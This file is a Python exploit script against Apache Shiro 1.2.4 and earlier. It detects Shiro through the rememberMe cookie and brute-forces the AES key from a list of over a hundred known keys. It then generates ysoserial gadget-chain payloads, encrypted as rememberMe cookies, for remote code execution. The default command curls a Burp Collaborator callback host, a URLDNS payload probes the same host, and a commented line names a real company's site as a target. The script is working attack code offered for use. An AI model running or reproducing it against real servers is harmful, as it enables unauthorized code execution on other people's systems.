'''
how to use: python shiro_detect_url 
shiro <= 1.2.4
'''
import sys
# import uuid
import base64
import subprocess
import requests
import socket
import random
from Crypto.Cipher import AES
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
KEYS_SET = [
"kPH+bIxk5D2deZiIxcaaaA==", #默认
"4AvVhmFLUs0KTA3Kprsdag==", # jeecms
"0Av6jWaXCkCu5A9nJbPxLI==",
"0AvVhmFLUs0KTA3Kprsdag==",
"1AvVhdsgUs0FSA3SDFAdag==",
"1QWLxg+NYmxraMoxAXu/Iw==",
"1tC/xrDYs8ey+sa3emtiYw==",
"25BsmdYwjnfcWmnhAciDDg==",
"2A2V+RFLUs+eTA3Kpr+dag==",
"2AvVhdsgUs0FSA3SDFAdag==",
"2cVtiE83c4lIrELJwKGJUw==",
"2itfW92XazYRi5ltW0M2yA==",
"3AvVhdAgUs0FSA4SDFAdBg==",
"3AvVhmFLUs0KTA3Kprsdag==",
"3JvYhmBLUs0ETA5Kprsdag==",
"3qDVdLawoIr1xFd6ietnwg==",
"4BvVhmFLUs0KTA3Kprsdag==",
"5aaC5qKm5oqA5pyvAAAAAA==",
"5AvVhmFLUS0ATA4Kprsdag==",
"5AvVhmFLUs0KTA3Kprsdag==",
"5J7bIJIV0LQSN3c9LPitBQ==",
"5RC7uBZLkByfFfJm22q/Zw==",
"66v1O8keKNV3TTcGPK1wzg==",
"6AvVhmFLUs0KTA3Kprsdag==",
"6NfXkC7YVCV5DASIrEm1Rg==",
"6Zm+6I2j5Y+R5aS+5ZOlAA==",
"6ZmI6I2j3Y+R1aSn5BOlAA==",
"6ZmI6I2j5Y+R5aSn5ZOlAA==",
"7AvVhmFLUs0KTA3Kprsdag==",
"8AvVhmFLUs0KTA3Kprsdag==",
"8BvVhmFLUs0KTA3Kprsdag==",
"9AvVhmFLUs0KTA3Kprsdag==",
"9FvVhtFLUs0KnA3Kprsdyg==",
"a2VlcE9uR29pbmdBbmRGaQ==",
"a3dvbmcAAAAAAAAAAAAAAA==",
"A7UzJgh1+EWj5oBFi+mSgw==",
"aU1pcmFjbGVpTWlyYWNsZQ==",
"Bf7MfkNR0axGGptozrebag==",
"bWljcm9zAAAAAAAAAAAAAA==",
"bWluZS1hc3NldC1rZXk6QQ==",
"bXRvbnMAAAAAAAAAAAAAAA==",
"bya2HkYo57u6fWh5theAWw==",
"c+3hFGPjbgzGdrC+MHgoRQ==",
"c2hpcm9fYmF0aXMzMgAAAA==",
"cGhyYWNrY3RmREUhfiMkZA==",
"cGljYXMAAAAAAAAAAAAAAA==",
"ClLk69oNcA3m+s0jIMIkpg==",
"cmVtZW1iZXJNZQAAAAAAAA==",
"d2ViUmVtZW1iZXJNZUtleQ==",
"empodDEyMwAAAAAAAAAAAA==",
"ertVhmFLUs0KTA3Kprsdag==",
"eXNmAAAAAAAAAAAAAAAAAA==",
"f/SY5TIve5WWzT4aQlABJA==",
"fCq+/xW488hMTCD+cmJ3aQ==",
"FP7qKJzdJOGkzoQzo2wTmA==",
"fPimdozRt+SSSbZS8/HARA==",
"fsHspZw/92PrS3XrPW+vxw==",
"GAevYnznvgNCURavBhCr1w==",
"hBlzKg78ajaZuTE0VLzDDg==",
"HWrBltGvEZc14h9VpMvZWw==",
"i45FVt72K2kLgvFrJtoZRw==",
"IduElDUpDDXE677ZkhhKnQ==",
"Is9zJ3pzNh2cgTHB4ua3+Q==",
"Jt3C93kMR9D5e8QzwfsiMw==",
"L7RioUULEFhRyxM7a2R/Yg==",
"lT2UvDUmQwewm6mMoiw4Ig==",
"MDgBSEFqYIoWYezkWDywig==",
"MPdCMZ9urzEA50JDlDYYDg==",
"MTIzNDU2Nzg5MGFiY2RlZg==",
"MTIzNDU2NzgxMjM0NTY3OA==",
"MzVeSkYyWTI2OFVLZjRzZg==",
"NGk/3cQ6F5/UNPRh8LpMIg==",
"NsZXjXVklWPZwOfkvk6kUA==",
"O4pdf+7e+mZe8NyxMTPJmQ==",
"OUHYQzxQ/W9e/UjiAGu6rg==",
"OY//C4rhfwNxCQAQCrQQ1Q==",
"Q01TX0JGTFlLRVlfMjAxOQ==",
"r0e3c16IdVkouZgk1TKVMg==",
"rPNqM6uKFCyaL10AK51UkQ==",
"RVZBTk5JR0hUTFlfV0FPVQ==",
"s0KTA3mFLUprK4AvVhsdag==",
"SDKOLKn2J1j/2BHjeZwAoQ==",
"sHdIjUN6tzhl8xZMG3ULCQ==",
"SkZpbmFsQmxhZGUAAAAAAA==",
"tiVV6g3uZBGfgshesAQbjA==",
"U0hGX2d1bnMAAAAAAAAAAA==",
"U3BAbW5nQmxhZGUAAAAAAA==",
"U3ByaW5nQmxhZGUAAAAAAA==",
"UGlzMjAxNiVLeUVlXiEjLw==",
"V2hhdCBUaGUgSGVsbAAAAA==",
"vXP33AonIp9bFwGl7aT7rA==",
"WcfHGU25gNnTxTlmJMeSpw==",
"wGiHplamyXlVB11UXWol8g==",
"WkhBTkdYSUFPSEVJX0NBVA==",
"WuB+y2gcHRnY2Lg9+Aqmqg==",
"XgGkgqGqYrix9lI6vxcrRw==",
"XTx6CKLo/SdSgub+OPHSrw==",
"xVmmoltfpb8tTceuT5R7Bw==",
"Y1JxNSPXVwMkyvES/kJGeQ==",
"yeAAo1E8BOeAYfBlm4NG9Q==",
"YI1+nBV//m7ELrIyDHm6DQ==",
"Ymx1ZXdoYWxlAAAAAAAAAA==",
"yNeUgSzL/CfiWw1GALg6Ag==",
# "Z3h6eWd4enklMjElMjElMjE=",
"Z3VucwAAAAAAAAAAAAAAAA==",
"ZAvph3dsQs0FSL3SDFAdag==",
"ZmFsYWRvLnh5ei5zaGlybw==",
"ZnJlc2h6Y24xMjM0NTY3OA==",
"ZUdsaGJuSmxibVI2ZHc9PQ=="]

JAVA_PATH = 'java'
#YSOSERIAL_PATH = '/Users/cyan/HackerTools/command-tools/ysoserial-0.0.6-Plus.jar'
YSOSERIAL_PATH = '/Users/cyan/Tools/ysoserial-0.0.8-SNAPSHOT-all.jar'
DNS_LOG_HOST = 'http://im8kejmiehnhs5ziku6nwyp5bwhm5b.burpcollaborator.net'
PAYLOAD = 'CommonsCollections10'
COMMAND = "curl im8kejmiehnhs5ziku6nwyp5bwhm5b.burpcollaborator.net"
# COMMAND = sys.argv[2]


def general_serial(PAYLOAD,COMMAND):
    popen = subprocess.Popen([JAVA_PATH, '-jar', YSOSERIAL_PATH, PAYLOAD, COMMAND], stdout=subprocess.PIPE)
    serial_str = popen.stdout.read()
    return serial_str

def encode_rememberme(serial_str,key):
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode(key)
    iv = b' ' * 16
    # iv = uuid.uuid4().bytes
    # print("iv:",iv)
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    # print(serial_str)
    file_body = pad(serial_str)
    # print(serial_str)
    base64_ciphertext = str(base64.b64encode(iv + encryptor.encrypt(file_body)),"utf-8")
    # print(base64_ciphertext)
    # print("")
    return base64_ciphertext

def decode_rememberme(base64_str,key):
    seri_str = base64.b64decode(base64_str)
    mode = AES.MODE_CBC
    iv = b' ' * 16
    encryptor = AES.new(base64.b64decode(key), mode, IV=iv)
    remember_bin = encryptor.decrypt(seri_str)
    return remember_bin

def detect_shiro(url,cookie = {"rememberMe":"123"}):
    header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36'}
    try:
        res = requests.get(url,headers=header,cookies=cookie,allow_redirects=False,timeout=10,verify=False)
    except Exception as e:
        print(e.__class__.__name__)
        return -1
    if('Set-Cookie' in res.headers.keys()):
        if('rememberMe' in res.headers['Set-Cookie']):
            return 1
    # for h in res.headers:
    #   print(f"{h}: {res.headers[h]}")
    return 0

def dns_payload(url=DNS_LOG_HOST,key='kPH+bIxk5D2deZiIxcaaaA=='):
    return encode_rememberme(general_serial("URLDNS",url),key)

def exp(key='kPH+bIxk5D2deZiIxcaaaA==',payload=PAYLOAD,command=COMMAND):
    return encode_rememberme(general_serial(PAYLOAD,COMMAND),key)

def check_key(target):
    code=detect_shiro(target)
    if code == 1:
        print("-"*80)
        print(f'target: {target}')
        print("-"*80)
        # simplePrincipalCollection 序列化数据，用于检测 shiro 的 key 是否正确, 错误的 key 会返回 rememberMe=deleteMe，正确则不会返回 rememberMe
        simplePrincipalCollection_bin_base64encode = 'rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA=='
        serial_str=base64.b64decode(simplePrincipalCollection_bin_base64encode)
        for key in KEYS_SET:
            remember_str = encode_rememberme(serial_str,key)
            cookie = {"rememberMe": remember_str}
            if detect_shiro(target,cookie) == 0:
                print(f"Checked\tKEY: {key}\t valid")
                return key
            print(f"Checked\tKEY: {key}")
        else:
            print("-"*80)
            print("Not found a valid key")
    elif code == -1:
        print(f'{target}: request error')
    else:
        print(f'{target}: Not Find Shiro')
    return ''

if __name__ == '__main__':
    # tomcat + cc3.2.1 => cc10
    # cc4.0 => cc2

    CC = ["CommonsBeanutils1","Jdk7u21","CommonsCollections1","CommonsCollections2","CommonsCollections3","CommonsCollections4","CommonsCollections5","CommonsCollections6","CommonsCollections7","CommonsCollections8","CommonsCollections9","CommonsCollections10"]
    if len(sys.argv) > 1:
        target = sys.argv[1]
        key=check_key(target)
        if key!='':
            print("-"*80)
            print(f"PAYLOAD: DNSLOG\tURL: {DNS_LOG_HOST}")
            print("-"*80)
            print(dns_payload(key=key))
            id = 1;
            # for cc in CC:
            print("-"*80)
            print(f"{id}\tPAYLOAD: {PAYLOAD}\tCOMMAND: {COMMAND}")
            # detect_shiro("https://tw.saicmotor.com/groupService/f",cookie = {"rememberMe": exp(key)})
            print("-"*80)
            id+=1
            print(exp(key))
    else:
        print(f"shiro https://example.com/")






